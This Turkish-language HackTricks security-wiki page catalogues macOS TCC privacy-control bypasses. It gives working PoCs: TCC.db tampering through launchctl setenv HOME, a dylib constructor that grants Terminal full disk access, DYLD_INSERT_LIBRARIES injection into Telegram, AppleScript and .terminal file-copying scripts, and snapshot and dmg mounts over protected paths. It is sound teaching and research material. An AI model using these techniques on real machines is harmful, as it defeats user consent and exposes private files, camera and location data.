# macOS TCC Atlatmaları

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## İşlevselliğe Göre

### Yazma Atlatması

Bu bir atlatma değil, sadece TCC'nin nasıl çalıştığıdır: **Yazmayı korumaz**. Terminal **bir kullanıcının Masaüstünü okuma erişimine sahip değilse bile içine yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Genişletilmiş öznitelik `com.apple.macl`**, **oluşturucu uygulamanın** onu okuma erişimine sahip olması için yeni **dosyaya** eklenir.

### TCC ClickJacking

Kullanıcıyı **fark etmeden kabul etmesini** sağlamak için TCC uyarısının üzerine bir pencere **yerleştirilebilir**. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de** bulabilirsiniz.

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Keyfi İsimle TCC İsteği

Saldırgan, **`Info.plist`** içinde herhangi bir isimle uygulamalar oluşturabilir (örneğin Finder, Google Chrome...) ve bu uygulamanın bazı TCC korumalı konumlara erişim istemesini sağlayabilir. Kullanıcı, meşru uygulamanın bu erişimi isteyen uygulama olduğunu düşünecektir.\
Ayrıca, meşru uygulamayı Dock'tan kaldırmak ve sahte olanı yerine koymak mümkündür, böylece kullanıcı sahte olanı tıkladığında (aynı simgeyi kullanabilir) meşru olanı çağırabilir, TCC izinlerini isteyebilir ve kötü amaçlı yazılımı yürütebilir, böylece kullanıcı meşru uygulamanın erişimi istediğine inanır.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC için:

{% content-ref url="../../../macos-privilege-escalation.md" %}
[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
{% endcontent-ref %}

### SSH Atlatma

Varsayılan olarak **SSH üzerinden erişim "Tam Disk Erişimi"**ne sahiptir. Bunun devre dışı bırakılması için listelenmiş ancak devre dışı bırakılmış olması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):

![](<../../../../../.gitbook/assets/image (569).png>)

İşte bazı **kötü amaçlı yazılımların bu korumayı atlatmayı** nasıl başardığını gösteren örnekler:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Şu anda SSH'yi etkinleştirebilmek için **Tam Disk Erişimi'ne** ihtiyacınız vardır
{% endhint %}

### Uzantıları İşleme - CVE-2022-26767

Dosyalara **belirli bir uygulamanın okuma izinlerini vermek** için **`com.apple.macl`** özniteliği verilir. Bu öznitelik, bir dosyayı bir uygulamanın üzerine **sürükleyip bıraktığınızda** veya bir kullanıcı bir dosyayı **çift tıklattığında** varsayılan uygulama ile açtığında ayarlanır.

Bu nedenle, bir kullanıcı **tüm uzantıları işlemek için kötü amaçlı bir uygulama** kaydedebilir ve Launch Services'ı çağırarak herhangi bir dosyayı **açabilir** (bu nedenle kötü amaçlı dosya okuma izni verilir).

### iCloud

**`com.apple.private.icloud-account-access`** ayrıcalığı ile **`com.apple.iCloudHelper`** XPC hizmetiyle iletişim kurulabilir ve bu hizmet **iCloud belgelerini sağlayabilir**.

**iMovie** ve **Garageband** bu ayrıcalığa sahipti ve diğerleri de sahip olabilir.

Bu ayrıcalıktan **iCloud belgelerini almak için** kullanılan açıktan daha fazla **bilgi** için şu konuşmayı kontrol edin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Otomasyon

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama **diğer Uygulamaları kontrol edebilir**. Bu, diğer Uygulamalara verilen izinleri **kötüye kullanabileceği** anlamına gelir.

Apple Betikleri hakkında daha fazla bilgi için kontrol edin:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Örneğin, bir Uygulamanın **`iTerm` üzerinde Otomasyon izni** varsa, örneğin bu örnekte **`Terminal`**'in iTerm üzerinde erişimi vardır:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### iTerm Üzerinde

FDA'ya sahip olmayan Terminal, FDA'ya sahip iTerm'i çağırabilir ve onu kullanarak işlemler gerçekleştirebilir:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder Üzerinden

Veya bir Uygulamanın Finder üzerinden erişimi varsa, şöyle bir betik çalıştırabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanı **tccd daemon**'ı, TCC kullanıcı veritabanına erişmek için **`HOME`** **env** değişkenini kullanır: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[Şu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemonı mevcut kullanıcının etki alanı içinde `launchd` aracılığıyla çalıştığından, **tüm çevre değişkenlerini kontrol etmek mümkündür**.\
Bu nedenle, bir **saldırgan**, **`launchctl`** içinde **`$HOME`** çevre değişkenini kontrol edilen bir **dizine** işaret etmek için ayarlayabilir, **TCC** daemonını **yeniden başlatabilir** ve ardından **TCC veritabanını doğrudan değiştirerek** kendisine **kullanılabilir tüm TCC yetkilerini** vererek son kullanıcıya hiçbir zaman sormadan.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notlar, TCC korumalı konumlara erişime sahipti ancak bir not oluşturulduğunda bu **korumalı olmayan bir konumda oluşturulur**. Bu nedenle, notlara korumalı bir dosyayı bir nota kopyalamasını isteyebilir ve ardından dosyaya erişebilirsiniz:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Taşınma

`/usr/libexec/lsd` ikili dosyası, `libsecurity_translocate` kütüphanesi ile `com.apple.private.nullfs_allow` yetkisine sahipti, bu da **nullfs** bağlantısını oluşturmasına izin veriyordu ve `com.apple.private.tcc.allow` yetkisine sahipti ve **`kTCCServiceSystemPolicyAllFiles`** ile her dosyaya erişim sağlıyordu.

"Library" klasörüne karantina özniteliği eklemek, **`com.apple.security.translocation`** XPC servisini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** olarak eşlemek ve Library içindeki tüm belgelere **erişmek** mümkündü.

### CVE-2023-38571 - Müzik ve TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Müzik`** ilginç bir özelliğe sahiptir: Çalıştığında, kullanıcının "ortam kütüphanesine" **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** bırakılan dosyaları **ithal eder**. Ayrıca şunu çağırır: **`rename(a, b);`** burada `a` ve `b` şunlardır:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Bu **`rename(a, b);`** davranışı bir **Yarış Koşulu**na karşı savunmasızdır, çünkü `Automatically Add to Music.localized` klasörüne sahte bir **TCC.db** dosyası yerleştirmek ve ardından yeni klasörün (b) oluşturulduğunda dosyayı kopyalamak, silmek ve onu **`~/Library/Application Support/com.apple.TCC`**'ye yönlendirmek mümkündür.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

**`SQLITE_SQLLOG_DIR="yol/klasör"`** ise temelde **herhangi bir açık db'nin o yola kopyalandığı** anlamına gelir. Bu CVE'de bu kontrol, **FDA'ya sahip bir işlem tarafından açılacak bir SQLite veritabanına yazmak** için kötüye kullanıldı ve ardından **`SQLITE_SQLLOG_DIR`**'yi dosya adındaki bir **sembolik bağlantı ile** kötüye kullanarak, bu veritabanı **açıldığında**, kullanıcı **TCC.db'si açılanla üzerine yazılır**.

**Daha fazla bilgi** [**yazılımda**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve** [**sunumda**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Eğer **`SQLITE_AUTO_TRACE`** ortam değişkeni ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **günlüğe kaydetmeye** başlayacaktır. Birçok uygulama bu kütüphaneyi kullandığından, tüm SQLite sorgularını günlüğe kaydetmek mümkündü.

Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullanmaktadır.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Bu **çevre değişkeni, çeşitli programların bağımlılığı olan `Metal` çerçevesi tarafından kullanılır**, en önemlisi `Music` programıdır, FDA'ya sahiptir.

Aşağıdaki ayarı yapmak: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir dizin ise, hata tetiklenecek ve programda neler olup bittiğini görmek için `fs_usage` kullanabiliriz:

* `open()` ile `path/.dat.nosyncXXXX.XXXXXX` (X rastgele) adında bir dosya açılacak
* bir veya daha fazla `write()` işlemi içeriği dosyaya yazacak (bunu kontrol etmiyoruz)
* `path/.dat.nosyncXXXX.XXXXXX` `rename()` ile `path/name` olarak yeniden adlandırılacak

Bu geçici bir dosya yazma işlemidir, ardından **güvenli olmayan bir şekilde** **`rename(eski, yeni)`** işlemi gerçekleşir.

Bu güvenli değildir çünkü **eski ve yeni yolları ayrı ayrı çözmesi** gerekir, bu da biraz zaman alabilir ve Yarış Koşulu'na karşı savunmasız olabilir. Daha fazla bilgi için `xnu` fonksiyonu olan `renameat_internal()`'ı kontrol edebilirsiniz.

{% hint style="danger" %}
Yani, temelde, bir ayrıcalıklı işlem, kontrol ettiğiniz bir klasörden yeniden adlandırma yaptığında, bir RCE kazanabilir ve farklı bir dosyaya erişmesini veya bu CVE'de olduğu gibi, ayrıcalıklı uygulamanın oluşturduğu dosyayı açmasını ve bir FD saklamasını sağlayabilir.

Yeniden adlandırma, kontrol ettiğiniz bir klasöre erişirse, kaynak dosyayı değiştirmiş veya bir FD'si varsa, hedef dosyayı (veya klasörü) bir sembolik bağa işaret etmek için değiştirebilirsiniz, böylece istediğiniz zaman yazabilirsiniz.
{% endhint %}

Bu, CVE'deki saldırıydı: Örneğin, kullanıcının `TCC.db` dosyasını üzerine yazmak için şunları yapabiliriz:

* `/Users/hacker/ourlink`'i `/Users/hacker/Library/Application Support/com.apple.TCC/`'ye işaret edecek şekilde oluşturun
* `/Users/hacker/tmp/` dizinini oluşturun
* `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` olarak ayarlayın
* bu çevre değişkeni ile `Music`'i çalıştırarak hatayı tetikleyin
* `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`'in `open()`'ını yakalayın (X rastgele)
* burada ayrıca bu dosyayı yazmak için `open()` yapın ve dosya tanımlayıcısını elinizde tutun
* `/Users/hacker/tmp`'yi atomik olarak `/Users/hacker/ourlink` ile **bir döngü içinde değiştirin**
* bunu yapmamızın nedeni, yarış penceresinin oldukça dar olması nedeniyle başarılı olma şansımızı maksimize etmek, ancak yarışı kaybetmenin ihmal edilebilir bir dezavantajı vardır
* biraz bekleyin
* şanslı olup olmadığımızı test edin
* değilse, tekrar en baştan başlayın

Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Şimdi, eğer `MTL_DUMP_PIPELINES_TO_JSON_FILE` çevre değişkenini kullanmaya çalışırsanız, uygulamalar başlatılmaz
{% endhint %}

### Apple Uzak Masaüstü

Root olarak bu hizmeti etkinleştirebilir ve **ARD ajanı tam disk erişimine sahip olacak**, bu da ardından bir kullanıcının yeni bir **TCC kullanıcı veritabanı** kopyalamasını sağlamak için kötüye kullanılabilir.

## **NFSHomeDirectory** ile

TCC, kullanıcının HOME klasöründeki bir veritabanını kontrol etmek için kullanır, bu da kullanıcının **$HOME/Library/Application Support/com.apple.TCC/TCC.db** yolundaki kullanıcıya özgü kaynaklara erişimi kontrol etmek için kullanılır.\
Bu nedenle, kullanıcı, TCC'yi herhangi bir uygulamaya herhangi bir TCC iznini vermek için kandırabilecek şekilde **farklı bir klasöre işaret eden $HOME çevresel değişkeniyle TCC'yi yeniden başlatmayı başarırsa**, yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir uygulamaya herhangi bir TCC izni vermek için kandırabilir.

{% hint style="success" %}
Apple, `$HOME` değerinin **`NFSHomeDirectory`** özniteliğinde saklanan ayarı kullanır, bu nedenle bu değeri değiştirmeye izin veren izinlere sahip bir uygulamayı ele geçirirseniz (**`kTCCServiceSystemPolicySysAdminFiles`**), bu seçeneği bir TCC atlatma ile **silahlandırabilirsiniz**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, hedef uygulama için bir _csreq_ blogu alır.

1. Gerekli erişim ve _csreq_ blogu ile sahte bir _TCC.db_ dosyası yerleştirin.
2. Kullanıcının Directory Services girişini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile dışa aktarın.
3. Kullanıcının ev dizinini değiştirmek için Directory Services girişini değiştirin.
4. Değiştirilmiş Directory Services girişini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile içe aktarın.
5. Kullanıcının _tccd_'sini durdurun ve işlemi yeniden başlatın.

**İkinci POC**, `com.apple.private.tcc.allow` değeri `kTCCServiceSystemPolicySysAdminFiles` olan **`/usr/libexec/configd`**'yi kullanıyordu.\
Saldırgan, **`configd`**'yi **`-t`** seçeneğiyle çalıştırarak özel bir **Bağlayıcı yüklemesi** belirleyebilirdi. Bu nedenle, saldırı, kullanıcının ev dizinini değiştirmenin **`dsexport`** ve **`dsimport`** yöntemini **`configd` kod enjeksiyonu** ile değiştiriyordu.

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bakın.

## İşlem enjeksiyonu ile

Bir işlem içine kod enjekte etmek ve TCC ayrıcalıklarını kötüye kullanmak için farklı teknikler vardır:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

Ayrıca, TCC'yi atlatmak için en yaygın işlem enjeksiyonu, **eklentiler (kütüphane yükleme)** aracılığıyla gerçekleştirilir.\
Eklentiler, genellikle kütüphane veya plist biçiminde ekstra kodlardır, ana uygulama tarafından **yüklenir** ve kendi bağlamı altında çalıştırılır. Bu nedenle, ana uygulamanın TCC kısıtlı dosyalara erişimi varsa (izin verilen izinler veya yetkilendirmeler aracılığıyla), **özel kodun da olacaktır**.

### CVE-2020-27937 - Directory Utility

Uygulama `/System/Library/CoreServices/Applications/Directory Utility.app`, **`kTCCServiceSystemPolicySysAdminFiles`** yetkisine sahipti, **`.daplug`** uzantılı eklentileri yüklüyordu ve **sertleştirilmiş** çalışma zamanına sahip değildi.

Bu CVE'yi silahlandırmak için, **`NFSHomeDirectory`** (önceki yetkiyi kötüye kullanarak) **değiştirildi**, böylece TCC'yi atlatmak için kullanıcıların TCC veritabanını ele geçirebilmek mümkün hale geldi.

Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakın.
### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** ikili dosyasının ayrıcalıkları `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` idi. İlk ayrıcalık **kod enjeksiyonuna izin verirken**, ikinci ayrıcalık ise **TCC'yi yönetme erişimi sağlıyordu**.

Bu ikili dosya, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf eklentileri yüklemeye izin veriyordu**. Bu nedenle, bu PoC ile **bir eklenti yüklemek ve TCC izinlerini kötüye kullanmak mümkündü**:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.

### Aygıt Soyutlama Katmanı (DAL) Eklentileri

**Core Media I/O** aracılığıyla kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`**'ya sahip uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` dizininde bulunan **bu eklentileri** işlem içine yükler (SIP kısıtlaması olmadan).

Oraya yaygın **yapıcı** ile bir kütüphane saklamak, **kod enjekte etmek** için çalışacaktır.

Birçok Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkileri bulunmaktaydı:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Daha fazla bilgi için bu [**orijinal raporu kontrol edin**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ikili dosyasında **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** yetkileri vardı, bu da süreç içine kod enjekte etmeye ve TCC ayrıcalıklarını kullanmaya olanak tanıdı.

### CVE-2023-26818 - Telegram

Telegram'ın **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkileri vardı, bu nedenle kamerayla kayıt yapma gibi izinlere erişmek mümkündü. [**Payload'ı yazıda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Ortam değişkenini kullanmak için bir kütüphane yüklemek için **özel bir plist** oluşturuldu ve bunu enjekte etmek için **`launchctl`** kullanıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Açık çağrılarla

Kumlanmışken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Betikleri

Terminal'e **Tam Disk Erişimi (TDE)** vermek oldukça yaygındır, en azından teknik kişiler tarafından kullanılan bilgisayarlarda. Ve **`.terminal`** betiklerini bu erişimle çağırmak mümkündür.

**`.terminal`** betikleri, **`CommandString`** anahtarında yürütülecek komutla birlikte olan bu örnekteki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konumda bir terminal betiği yazabilir ve şu şekilde bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Bağlama Yoluyla

### CVE-2020-9771 - mount\_apfs TCC atlatma ve ayrıcalık yükseltme

**Herhangi bir kullanıcı** (hatta ayrıcalıksız olanlar bile) bir zaman makinesi anı görüntüsü oluşturabilir ve bağlayabilir ve o anı görüntüsündeki **TÜM dosyalara erişebilir**.\
Kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olması gereken **tek ayrıcalık**, bunun bir yönetici tarafından verilmesi gereken (`kTCCServiceSystemPolicyAllfiles`) ayrıcalıktır.

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Daha detaylı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyası üzerinden Mount işlemi

TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizin üzerine mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**Tam exploit**'i [**orijinal yazıda**](https://theevilbit.github.io/posts/cve-2021-30808/) kontrol edin.

### asr

**`/usr/sbin/asr`** aracı, TCC korumalarını atlayarak tüm diski kopyalayıp başka bir yere bağlamaya izin veriyordu.

### Konum Hizmetleri

**`/var/db/locationd/clients.plist`** içinde üçüncü bir TCC veritabanı bulunur ve burada **konum hizmetlerine erişime izin verilen istemciler** belirtilir.\
**`/var/db/locationd/` klasörü DMG bağlama koruması olmadığından** kendi plist'imizi bağlamak mümkündü.

## Başlangıç uygulamalarıyla

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Grep ile

Bazı durumlarda dosyalar hassas bilgileri (e-postalar, telefon numaraları, mesajlar...) korunmayan konumlarda saklarlar (bu da Apple için bir zayıflık olarak kabul edilir).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Sentetik Tıklamalar

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Başka bir yol [**CoreGraphics olayları kullanarak**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Referans

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)
